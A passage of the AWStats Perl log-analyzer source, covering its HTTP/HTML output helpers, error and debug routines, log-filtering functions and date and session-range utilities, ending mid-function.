

#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

# Function to solve pb with openvms
sub file_filt (@) {
    my @retval;
    foreach my $fl (@_) {
        $fl =~ tr/^//d;
        push @retval, $fl;
    }
    return sort @retval;
}

#------------------------------------------------------------------------------
# Function:		Write on output header of HTTP answer
# Parameters:	None
# Input:		$HeaderHTTPSent $BuildReportFormat $PageCode $Expires
# Output:		$HeaderHTTPSent=1
# Return:		None
#------------------------------------------------------------------------------
sub http_head {
    if ( !$HeaderHTTPSent ) {
        my $newpagecode = $PageCode ? $PageCode : "utf-8";
        if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {
            print( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i
                ? "Content-type: text/html; charset=$newpagecode\n"
                : "Content-type: text/xml; charset=$newpagecode\n"
            );
        }
        else { print "Content-type: text/html; charset=$newpagecode\n"; }

        # Expires must be GMT ANSI asctime and must be after Content-type to avoid pb with some servers (SAMBAR)
        if ( $Expires =~ /^\d+$/ ) {
            print "Cache-Control: public\n";
            print "Last-Modified: " . gmtime($starttime) . "\n";
            print "Expires: " . ( gmtime( $starttime + $Expires ) ) . "\n";
        }
        print "\n";
    }
    $HeaderHTTPSent++;
}

#------------------------------------------------------------------------------
# Function:		Write on output header of HTML page
# Parameters:	None
# Input:		%HTMLOutput $PluginMode $Expires $Lang $StyleSheet $HTMLHeadSection $PageCode $PageDir
# Output:		$HeaderHTMLSent=1
# Return:		None
#------------------------------------------------------------------------------
sub html_head {
    my $dir = $PageDir ? 'right' : 'left';
    if ($NOHTML) { return; }
    if ( scalar keys %HTMLOutput || $PluginMode ) {
        my $periodtitle = " ($YearRequired";
        $periodtitle .= ( $MonthRequired ne 'all' ? "-$MonthRequired" : "" );
        $periodtitle .= ( $DayRequired   ne ''    ? "-$DayRequired"   : "" );
        $periodtitle .= ( $HourRequired  ne ''    ? "-$HourRequired"  : "" );
        $periodtitle .= ")";

        # Write head section
        if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {
            if ($PageCode) {
                print "<?xml version=\"1.0\" encoding=\"$PageCode\"?>\n";
            }
            else { print "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n"; }
            if ( $FrameName ne 'index' ) {
                print
                    "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n";
            }
            else {
                print
                    "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Frameset//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd\">\n";
            }
            print
                "<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"$Lang\">\n";
        }
        else {
            if ( $FrameName ne 'index' ) {
                print
                    "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n";
            }
            else {
                print
                    "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Frameset//EN\" \"http://www.w3.org/TR/html4/frameset.dtd\">\n";
            }
            print '<html lang="' . $Lang . '"'
                . ( $PageDir ? ' dir="rtl"' : '' ) . ">\n";
        }
        print "<head>\n";

        my $endtag = '>';
        if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {
            $endtag = ' />';
        }

        # Affiche tag meta generator
        print
            "<meta name=\"generator\" content=\"AWStats $VERSION from config file awstats.$SiteConfig.conf (http://www.awstats.org)\"$endtag\n";

        # Affiche tag meta robots
        if ($MetaRobot) {
            print "<meta name=\"robots\" content=\""
                . ( $FrameName eq 'mainleft' ? 'no' : '' )
                . "index,"
                . (    $FrameName eq 'mainleft'
                || $FrameName eq 'index' ? '' : 'no' )
                . "follow\"$endtag\n";
        }
        else {
            print "<meta name=\"robots\" content=\"noindex,nofollow\"$endtag\n";
        }

        # Affiche tag meta content-type
        if ( $BuildReportFormat eq 'xhtml' || $BuildReportFormat eq 'xml' ) {
            print( $ENV{'HTTP_USER_AGENT'} =~ /MSIE|Googlebot/i
                ? "<meta http-equiv=\"content-type\" content=\"text/html; charset="
                . ( $PageCode ? $PageCode : "iso-8859-1" )
                . "\" />\n"
                : "<meta http-equiv=\"content-type\" content=\"text/xml; charset="
                . ( $PageCode ? $PageCode : "iso-8859-1" )
                . "\"$endtag\n"
            );
        }
        else {
            print
                "<meta http-equiv=\"content-type\" content=\"text/html; charset="
                    . ( $PageCode ? $PageCode : "iso-8859-1" )
                    . "\"$endtag\n";
        }

        if ($Expires) {
            print "<meta http-equiv=\"expires\" content=\""
                . ( gmtime( $starttime + $Expires ) )
                . "\"$endtag\n";
        }
        my @k = keys
            %HTMLOutput;    # This is to have a unique title and description page
        print "<meta http-equiv=\"description\" content=\""
            . ucfirst($PROG)
            . " - Advanced Web Statistics for $SiteDomain$periodtitle"
            . ( $k[0] ? " - " . $k[0] : "" )
            . "\"$endtag\n";
        if ( $MetaRobot && $FrameName ne 'mainleft' ) {
            print
                "<meta http-equiv=\"keywords\" content=\"$SiteDomain, free, advanced, realtime, web, server, logfile, log, analyzer, analysis, statistics, stats, perl, analyse, performance, hits, visits\"$endtag\n";
        }
        print "<title>$Message[7] $SiteDomain$periodtitle"
            . ( $k[0] ? " - " . $k[0] : "" )
            . "</title>\n";
        if ( $FrameName ne 'index' ) {

            if ($StyleSheet) {
                print "<link rel=\"stylesheet\" href=\"$StyleSheet\" />\n";
            }

            # A STYLE section must be in head section. Do not use " for number in a style section
            print "<style type=\"text/css\">\n";

            if ( !$StyleSheet ) {
                print
                    "body { font: 1.2em verdana, arial, helvetica, sans-serif; background-color: #$color_Background; margin-top: 0; margin-bottom: 0; }\n";
                print ".aws_bodyl  { }\n";
                print
                    ".aws_border { border-collapse: collapse; background-color: #$color_TableBG; padding: 1px 1px "
                        . (    $BuildReportFormat eq 'xhtml'
                        || $BuildReportFormat eq 'xml' ? "2px" : "1px" )
                        . " 1px; margin-top: 0px; margin-bottom: 0px; }\n";
                print
                    ".aws_title  { font: 1em verdana, arial, helvetica, sans-serif; font-weight: bold; background-color: #$color_TableBGTitle; text-align: center; margin-top: 0; margin-bottom: 0; padding: 5px; color: #$color_TableTitle; }\n";
                print
                    ".aws_blank  { font: 13px verdana, arial, helvetica, sans-serif; background-color: #$color_Background; text-align: center; margin-bottom: 0; padding: 1px 1px 1px 1px; }\n";
                print <<EOF;
.aws_data {
	background-color: #$color_Background;
	border-top-width: 1px;
	border-left-width: 0px;
	border-right-width: 0px;
	border-bottom-width: 0px;
}
.aws_formfield { font: 13px verdana, arial, helvetica; }
.aws_button {
	font-family: arial,verdana,helvetica, sans-serif;
	font-size: 12px;
	border: 1px solid #ccd7e0;
	background-image : url($DirIcons/other/button.gif);
}
th		{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font: 11px verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_titletext; }
th.aws	{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; padding: 1px 2px 1px 1px; font-size: 13px; font-weight: bold; }
td		{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; font: 0.9em verdana, arial, helvetica, sans-serif; text-align:center; color: #$color_text; }
td.aws	{ border-color: #$color_TableBorder; border-left-width: 0px; border-right-width: 1px; border-top-width: 0px; border-bottom-width: 1px; text-align:$dir; color: #$color_text; padding: 6px;}
td.awsm	{ border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom-width: 0px; font: 0.8em verdana, arial, helvetica, sans-serif; text-align:$dir; color: #$color_text; padding: 0px; }
b { font-weight: bold; }
a:link    { color: #$color_link; text-decoration: none; }
a:visited { color: #$color_link; text-decoration: none; }
a:hover   { color: #$color_hover; text-decoration: underline; }
.aws_data th { font-size: 0.9em; padding: 5px; }
.currentday { font-weight: bold; }
EOF
            }

            # Call to plugins' function AddHTMLStyles
            foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLStyles'} } )
            {
                my $function = "AddHTMLStyles_$pluginname";
                &$function();
            }

            print "</style>\n";
        }

        # les scripts necessaires pour trier avec Tablekit
        #	print "<script type=\"text\/javascript\" src=\"/js/prototype.js\"><\/script>";
        #	print "<script type=\"text\/javascript\" src=\"/js/fabtabulous.js\"><\/script>";
        #	print "<script type=\"text\/javascript\" src=\"/js/mytablekit.js\"><\/script>";

        # Call to plugins' function AddHTMLHeader
        foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLHeader'} } )
        {
            my $function = "AddHTMLHeader_$pluginname";
            &$function();
        }

        print "</head>\n\n";
        if ( $FrameName ne 'index' ) {
            print "<body style=\"margin-top: 0px\"";
            if ( $FrameName eq 'mainleft' ) { print " class=\"aws_bodyl\""; }
            print ">\n";
        }
    }
    $HeaderHTMLSent++;
}

#------------------------------------------------------------------------------
# Function:		Write on output end of HTML page
# Parameters:	0|1 (0=no list plugins,1=list plugins)
# Input:		%HTMLOutput $HTMLEndSection $FrameName $BuildReportFormat
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub html_end {
    my $listplugins = shift || 0;
    if ( scalar keys %HTMLOutput ) {

        # Call to plugins' function AddHTMLBodyFooter
        foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyFooter'} } )
        {

            # my $function="AddHTMLBodyFooter_$pluginname()";
            # eval("$function");
            my $function = "AddHTMLBodyFooter_$pluginname";
            &$function();
        }

        if ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {
            print "$Center<br /><br />\n";
            print
                "<span dir=\"ltr\" style=\"font: 11px verdana, arial, helvetica; color: #$color_text;\">";
            print
                "<b>Advanced Web Statistics $VERSION</b> - <a href=\"http://www.awstats.org\" target=\"awstatshome\">";
            print $Message[169] . " $PROG";
            if ($listplugins) {
                my $atleastoneplugin = 0;
                foreach my $pluginname ( keys %{ $PluginsLoaded{'init'} } ) {
                    if ( !$atleastoneplugin ) {
                        $atleastoneplugin = 1;
                        print " ($Message[170]: ";
                    }
                    else { print ", "; }
                    print "$pluginname";
                }
                if ($atleastoneplugin) { print ")"; }
            }
            print "</a></span><br />\n";
            if ($HTMLEndSection) { print "<br />\n$HTMLEndSection\n"; }
        }
        print "\n";
        if ( $FrameName ne 'index' ) {
            if ( $FrameName ne 'mainleft' && $BuildReportFormat eq 'html' ) {
                print "<br />\n";
            }
            print "</body>\n";
        }
        print "</html>\n";

        #		print "<!-- NEW PAGE --><!-- NEW SHEET -->\n";
    }
}

#------------------------------------------------------------------------------
# Function:		Print on stdout tab header of a chart
# Parameters:	$title $tooltipnb [$width percentage of chart title]
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_head {
    my $title     = shift;
    my $tooltipnb = shift;
    my $width     = shift || 70;
    my $class     = shift;

    # Call to plugins' function TabHeadHTML
    my $extra_head_html = '';
    foreach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {
        my $function = "TabHeadHTML_$pluginname";
        $extra_head_html .= &$function($title);
    }

    if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
        print
            "<table class=\"aws_border sortable\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"800\">\n";
    }
    else {
        print
            "<table class=\"aws_border sortable\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
    }

    if ($tooltipnb) {
        print "<tr><td class=\"aws_title\" width=\"$width%\""
            . Tooltip( $tooltipnb, $tooltipnb )
            . ">$title "
            . $extra_head_html . "</td>";
    }
    else {
        print "<tr><td class=\"aws_title\" width=\"$width%\">$title "
            . $extra_head_html . "</td>";
    }
    print "<td class=\"aws_blank\">&nbsp;</td></tr>\n";
    print "<tr><td colspan=\"2\">\n";
    if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
        print
            "<table class=\"aws_data\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"796\">\n";
    }
    else {
        print
            "<table class=\"aws_data\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
    }
}

#------------------------------------------------------------------------------
# Function:		Print on stdout tab ender of a chart
# Parameters:	None
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_end {
    my $string = shift;
    print "</table></td></tr></table>";
    if ($string) {
        print
            "<span style=\"font: 11px verdana, arial, helvetica;\">$string</span><br />\n";
    }
    print "<br />\n\n";
}

#------------------------------------------------------------------------------
# Function:		Write error message and exit
# Parameters:	$message $secondmessage $thirdmessage $donotshowsetupinfo
# Input:		$HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub error {
    my $message = shift || '';
    if ( scalar keys %HTMLOutput ) {
        $message =~ s/\</&lt;/g;
        $message =~ s/\>/&gt;/g;
    }
    my $secondmessage      = shift || '';
    my $thirdmessage       = shift || '';
    my $donotshowsetupinfo = shift || 0;

    if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
    if ( !$HeaderHTMLSent && scalar keys %HTMLOutput )   {
        print "<html><body>\n";
        $HeaderHTMLSent = 1;
    }
    if ($Debug) { debug( "$message $secondmessage $thirdmessage", 1 ); }
    my $tagbold     = '';
    my $tagunbold   = '';
    my $tagbr       = '';
    my $tagfontred  = '';
    my $tagfontgrey = '';
    my $tagunfont   = '';
    if ( scalar keys %HTMLOutput ) {
        $tagbold     = '<b>';
        $tagunbold   = '</b>';
        $tagbr       = '<br />';
        $tagfontred  = '<span style="color: #880000">';
        $tagfontgrey = '<span style="color: #888888">';
        $tagunfont   = '</span>';
    }
    if ( !$ErrorMessages && $message =~ /^Format error$/i ) {

        # Files seems to have bad format
        if ( scalar keys %HTMLOutput )   { print "<br /><br />\n"; }
        if ( $message !~ $LogSeparator ) {

            # Bad LogSeparator parameter
            print
                "${tagfontred}AWStats did not found the ${tagbold}LogSeparator${tagunbold} in your log records.${tagbr}${tagunfont}\n";
        }
        else {

            # Bad LogFormat parameter
            print
                "AWStats did not find any valid log lines that match your ${tagbold}LogFormat${tagunbold} parameter, in the ${NbOfLinesForCorruptedLog}th first non commented lines read of your log.${tagbr}\n";
            print
                "${tagfontred}Your log file ${tagbold}$thirdmessage${tagunbold} must have a bad format or ${tagbold}LogFormat${tagunbold} parameter setup does not match this format.${tagbr}${tagbr}${tagunfont}\n";
            print
                "Your AWStats ${tagbold}LogFormat${tagunbold} parameter is:\n";
            print "${tagbold}$LogFormat${tagunbold}${tagbr}\n";
            print
                "This means each line in your web server log file need to have ";
            if ( $LogFormat == 1 ) {
                print
                    "${tagbold}\"combined log format\"${tagunbold} like this:${tagbr}\n";
                print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
                print
                    "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
                print(
                    scalar keys %HTMLOutput
                        ? "</i>$tagunfont${tagbr}${tagbr}\n"
                        : ""
                );
            }
            if ( $LogFormat == 2 ) {
                print
                    "${tagbold}\"MSIE Extended W3C log format\"${tagunbold} like this:${tagbr}\n";
                print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
                print
                    "date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\n";
                print(
                    scalar keys %HTMLOutput
                        ? "</i>$tagunfont${tagbr}${tagbr}\n"
                        : ""
                );
            }
            if ( $LogFormat == 3 ) {
                print
                    "${tagbold}\"WebStar native log format\"${tagunbold}${tagbr}\n";
            }
            if ( $LogFormat == 4 ) {
                print
                    "${tagbold}\"common log format\"${tagunbold} like this:${tagbr}\n";
                print( scalar keys %HTMLOutput ? "$tagfontgrey<i><pre>" : "" );
                print
                    "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234\n";
                print(
                    scalar keys %HTMLOutput
                        ? "</pre></i>$tagunfont${tagbr}${tagbr}\n"
                        : ""
                );
            }
            if ( $LogFormat == 6 ) {
                print
                    "${tagbold}\"Lotus Notes/Lotus Domino\"${tagunbold}${tagbr}\n";
                print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
                print
                    "111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
                print(
                    scalar keys %HTMLOutput
                        ? "</i></span>${tagbr}${tagbr}\n"
                        : ""
                );
            }
            if ( $LogFormat !~ /^[1-6]$/ ) {
                print "the following personalized log format:${tagbr}\n";
                print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
                print "$LogFormat\n";
                print(
                    scalar keys %HTMLOutput
                        ? "</i>$tagunfont${tagbr}${tagbr}\n"
                        : ""
                );
            }
            print
                "And this is an example of records AWStats found in your log file (the record number $NbOfLinesForCorruptedLog in your log):\n";
            print( scalar keys %HTMLOutput ? "<br />$tagfontgrey<i>" : "" );
            print "$secondmessage";
            print(
                scalar keys %HTMLOutput
                    ? "</i>$tagunfont${tagbr}${tagbr}"
                    : ""
            );
            print "\n";
        }

        #print "Note: If your $NbOfLinesForCorruptedLog first lines in your log files are wrong because of ";
        #print "a worm virus attack, you can increase the NbOfLinesForCorruptedLog parameter in config file.\n";
        #print "\n";
    }
    else {
        print( scalar keys %HTMLOutput ? "<br />$tagfontred\n" : "" );
        print( $ErrorMessages? "$ErrorMessages" : "Error: $message" );
        print( scalar keys %HTMLOutput ? "\n</span><br />" : "" );
        print "\n";
    }
    if ( !$ErrorMessages && !$donotshowsetupinfo ) {
        if ( $message =~ /Couldn.t open config file/i ) {
            my $dir = $DIR;
            if ( $dir =~ /^\./ ) { $dir .= '/../..'; }
            else { $dir =~ s/[\\\/]?wwwroot[\/\\]cgi-bin[\\\/]?//; }
            print "${tagbr}\n";
            if ( $ENV{'GATEWAY_INTERFACE'} ) {
                print
                    "- ${tagbold}Did you use the correct URL ?${tagunbold}${tagbr}\n";
                print
                    "Example: http://localhost/awstats/awstats.pl?config=mysite${tagbr}\n";
                print
                    "Example: http://127.0.0.1/cgi-bin/awstats.pl?config=mysite${tagbr}\n";
            }
            else {
                print
                    "- ${tagbold}Did you use correct config parameter ?${tagunbold}${tagbr}\n";
                print
                    "Example: If your config file is awstats.mysite.conf, use -config=mysite\n";
            }
            print
                "- ${tagbold}Did you create your config file 'awstats.$SiteConfig.conf' ?${tagunbold}${tagbr}\n";
            print
                "If not, you can run \"awstats_configure.pl\"\nfrom command line, or create it manually.${tagbr}\n";
            print "${tagbr}\n";
        }
        else {
            print "${tagbr}${tagbold}Setup ("
                . ( $FileConfig ? "'" . $FileConfig . "'" : "Config" )
                . " file, web server or permissions) may be wrong.${tagunbold}${tagbr}\n";
        }
        print
            "Check config file, permissions and AWStats documentation (in 'docs' directory).\n";
    }

    # Remove lock if not a lock message
    if ( $EnableLockForUpdate && $message !~ /lock file/ ) { &Lock_Update(0); }
    if ( scalar keys %HTMLOutput ) { print "</body></html>\n"; }
    exit 1;
}

#------------------------------------------------------------------------------
# Function:		Write a warning message
# Parameters:	$message
# Input:		$HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub warning {
    my $messagestring = shift;

    if ($Debug) { debug( "$messagestring", 1 ); }
    if ($WarningMessages) {
        if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
        if ( !$HeaderHTMLSent )        { html_head(); }
        if ( scalar keys %HTMLOutput ) {
            $messagestring =~ s,\n,<br />,g;
            print "$messagestring<br />\n";
        }
        else {
            print "$messagestring\n";
        }
    }
}

#------------------------------------------------------------------------------
# Function:     Write debug message and exit
# Parameters:   $string $level
# Input:        %HTMLOutput  $Debug=required level  $DEBUGFORCED=required level forced
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub debug {
    my $level = $_[1] || 1;

    if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {
        http_head();
    }    # To send the HTTP header and see debug
    if ( $level <= $DEBUGFORCED ) {
        my $debugstring = $_[0];
        if ( !$DebugResetDone ) {
            open( DEBUGFORCEDFILE, "<debug.log" );
            close DEBUGFORCEDFILE;
            chmod 0666, "debug.log";
            $DebugResetDone = 1;
        }
        open( DEBUGFORCEDFILE, ">>debug.log" );
        print DEBUGFORCEDFILE localtime(time)
            . " - $$ - DEBUG $level - $debugstring\n";
        close DEBUGFORCEDFILE;
    }
    if ( $DebugMessages && $level <= $Debug ) {
        my $debugstring = $_[0];
        if ( scalar keys %HTMLOutput ) {
            $debugstring =~ s/^ /&nbsp;&nbsp; /;
            $debugstring .= "<br />";
        }
        print localtime(time) . " - DEBUG $level - $debugstring\n";
    }
}

#------------------------------------------------------------------------------
# Function:     Optimize an array of precompiled regex by removing duplicate entries
# Parameters:	@Array notcasesensitive=0|1
# Input:        None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub OptimizeArray {
    my ( $array, $notcasesensitive ) = @_;
    my %seen;

    if ($notcasesensitive) {

        # Case insensitive
        my $uncompiled_regex;
        return map {
            $uncompiled_regex = UnCompileRegex($_);
            !$seen{ lc $uncompiled_regex }++ ? qr/$uncompiled_regex/i : ()
        } @$array;
    }

    # Case sensitive
    return map { !$seen{$_}++ ? $_ : () } @$array;
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipDNSLookupFor array
# Parameters:	ip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipDNSLookup {
    foreach (@SkipDNSLookupFor) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @SkipDNSLookupFor
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipHosts array
# Parameters:	host @SkipHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipHost {
    foreach (@SkipHosts) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @SkipHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipReferrers array
# Parameters:	host @SkipReferrers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipReferrer {
    foreach (@SkipReferrers) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @SkipReferrers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipUserAgents array
# Parameters:	useragent @SkipUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipUserAgent {
    foreach (@SkipUserAgents) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @SkipUserAgent
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipFiles array
# Parameters:	url @SkipFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipFile {
    foreach (@SkipFiles) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @SkipFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyHosts array
# Parameters:	host @OnlyHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyHost {
    foreach (@OnlyHosts) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @OnlyHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUsers array
# Parameters:	host @OnlyUsers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUser {
    foreach (@OnlyUsers) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @OnlyUsers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUserAgents array
# Parameters:	useragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUserAgent {
    foreach (@OnlyUserAgents) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @OnlyUserAgents
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in NotPageFiles array
# Parameters:	url @NotPageFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub NotPageFile {
    foreach (@NotPageFiles) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @NotPageFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyFiles array
# Parameters:	url @OnlyFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyFile {
    foreach (@OnlyFiles) {
        if ( $_[0] =~ /$_/ ) { return 1; }
    }
    0;    # Not in @OnlyFiles
}

#------------------------------------------------------------------------------
# Function:     Return day of week of a day
# Parameters:	$day $month $year
# Return:		0-6
#------------------------------------------------------------------------------
sub DayOfWeek {
    my ( $day, $month, $year ) = @_;
    if ($Debug) { debug( "DayOfWeek for $day $month $year", 4 ); }
    if ( $month < 3 ) { $month += 10; $year--; }
    else { $month -= 2; }
    my $cent = sprintf( "%1i", ( $year / 100 ) );
    my $y    = ( $year % 100 );
    my $dw   = (
        sprintf( "%1i", ( 2.6 * $month ) - 0.2 ) + $day + $y +
            sprintf( "%1i", ( $y / 4 ) ) + sprintf( "%1i", ( $cent / 4 ) ) -
            ( 2 * $cent ) ) % 7;
    $dw += 7 if ( $dw < 0 );
    if ($Debug) { debug( " is $dw", 4 ); }
    return $dw;
}

#------------------------------------------------------------------------------
# Function:     Return 1 if a date exists
# Parameters:	$day $month $year
# Return:		1 if date exists else 0
#------------------------------------------------------------------------------
sub DateIsValid {
    my ( $day, $month, $year ) = @_;
    if ($Debug) { debug( "DateIsValid for $day $month $year", 4 ); }
    if ( $day < 1 )  { return 0; }
    if ( $day > 31 ) { return 0; }
    if ( $month == 4 || $month == 6 || $month == 9 || $month == 11 ) {
        if ( $day > 30 ) { return 0; }
    }
    elsif ( $month == 2 ) {
        my $leapyear = ( $year % 4 == 0 ? 1 : 0 );   # A leap year every 4 years
        if ( $year % 100 == 0 && $year % 400 != 0 ) {
            $leapyear = 0;
        }    # Except if year is 100x and not 400x
        if ( $day > ( 28 + $leapyear ) ) { return 0; }
    }
    return 1;
}

#------------------------------------------------------------------------------
# Function:     Return string of visit duration
# Parameters:	$starttime $endtime
# Input:        None
# Output:		None
# Return:		A string from $SessionsRange[0..6] that identify the visit duration range
#------------------------------------------------------------------------------
sub GetSessionRange {
    my $param1=shift;
    my $param2=shift;

    # skip unneeded calculations if its the same
    if ($param1 == $param2) { return $SessionsRange[0]; }

    my $starttime;
    my $endtime;

    eval {
        #safety to prevent Time::Local causing termination on invalid data
        #Ex: Second '84' out of range 0..59 at /xxx/awstats.pl
        if ($param1 =~ /$regdate/o) { $starttime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
        if ($param2 =~ /$regdate/o) { $endtime = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
    };

    my $delay = $endtime - $starttime;
    if ($Debug) {
        debug( "GetSessionRange $endtime - $starttime = $delay", 4 );
    }
    if ( $delay <= 30 )   { return $SessionsRange[0]; }
    if ( $delay <= 120 )  { return $SessionsRange[1]; }
    if ( $delay <= 300 )  { return $SessionsRange[2]; }
    if ( $delay <= 900 )  { return $SessionsRange[3]; }
    if ( $delay <= 1800 ) { return $SessionsRange[4]; }
    if ( $delay <= 3600 ) { return $SessionsRange[5]; }
    return $SessionsRange[6];
}

#------------------------------------------------------------------------------
# Function:     Return string with just the extension of a file in the URL
# Parameters:	$regext, $url without query string
# Input:        None
# Output:		None
# Return:		A lowercase string with the name of the extension, e.g. "html"
#------------------------------------------------------------------------------
sub Get_Extension{
    my $extension;
    my $regext = shift;
    my $urlwithnoquery = shift;
    if ( $urlwithnoquery =~ /$regext/o
        || ( $urlwithnoquery =~ /[\\\/]$/ && $DefaultFile[0] =~ /$regext/o )
    )
    {
        $extension =
            ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )
                ? lc($1)
                : 'Unknown';
    }
    else {
        $extension = 'Unknown';
    }
    return $extension;
}

#------------------------------------------------------------------------------
# Function:     Returns just the file of the url
# Parameters:	-
# Input:        $url
# Output:		String with the file name
# Return:		-
#------------------------------------------------------------------------------
sub Get_Filename{
    my $temp = shift;
    my $idx = -1;
    # check for slash
    $idx = rindex($temp, "/");
    if ($idx > -1){ $temp = substr($temp, $idx+1);}
    else{
        $idx = rindex($temp, "\\");
        if ($idx > -1){ $temp = substr($temp, $idx+1);}
    }
    return $temp;
}

#------------------------------------------------------------------------------
# Function:     Return string of Bandwidth Range
# Parameters:   $starttime $endtime
# Input:        None
# Output:       None
# Return:       A string that identify the bandwidth range
#------------------------------------------------------------------------------
sub GetBandwidthRange {
    my $payload = shift;
    if ($Debug) { debug("GetPayloadRange $payload",4); }
    if ($payload <= 44)   { return $PayloadRange[0]; }
    if ($payload <= 100)  { return $PayloadRange[1]; }
    if ($payload <= 500)  { return $PayloadRange[2]; }
